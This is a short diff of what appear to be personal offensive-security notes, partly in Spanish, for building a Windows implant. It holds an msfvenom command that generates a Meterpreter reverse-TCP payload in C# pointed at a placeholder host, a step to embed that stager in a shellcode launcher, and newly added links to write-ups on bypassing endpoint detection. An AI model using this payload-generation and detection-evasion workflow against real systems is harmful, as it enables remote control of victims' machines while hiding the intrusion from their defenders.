@@ -4,3 +4,9 @@
 
 - msfvenom -a x86_64 -p windows/x64/meterpreter/reverse_tcp LHOST=[host] LPORT=4444 -f csharp
 - incrustar stager en shelcoderlauncher.cs
+
+## Documentation bypassing
+https://s3cur3th1ssh1t.github.io/
+
+## EDR bypass
+https://s3cur3th1ssh1t.github.io/A-tale-of-EDR-bypass-methods/
